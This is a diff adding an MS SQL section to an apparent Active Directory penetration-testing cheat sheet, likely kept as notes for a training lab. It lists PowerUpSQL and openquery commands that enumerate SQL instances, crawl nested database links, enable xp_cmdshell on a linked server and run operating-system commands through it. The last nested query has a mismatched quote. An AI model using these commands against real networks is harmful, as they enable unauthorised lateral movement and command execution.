@@ -894,6 +894,48 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:child.pa
 
 
 # MS SQL
+#### Enumerate
+
+```Get-SQLInstanceDomain```
+
+```Get-SQLConnectionTestThreaded```
+
+```Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded - Verbose```
+
+```Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose```
+
+#### Target - Database Links
+```Get-SQLServerLink -Instance dcorp-mssql -Verbose```
+
+Or
+
+```select * from master..sysservers```
+
+Now - 
+
+```select * from openquery("dcorp-sql1",'select * from master..sysservers')```
+
+
+```Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose```
+
+or via Openquery - queries can be chained to access links within links (nested links):
+
+```
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
+```
+
+#### Code Execution
+```EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"```
+
+```Get-SQLServerLinkCrawl -Instance ecorp-mssql  -Query "exec master..xp_cmdshell 'whoami'"```
+
+OR From within SQL:
+
+```
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp- mgmt",''select * from openquery("eu-sql",''''select @@version as version; exec master..xp_cmdshell "powershell whoami)'''')'')')
+```
+
+
 
 # Forest Persistence - DCShadow
 
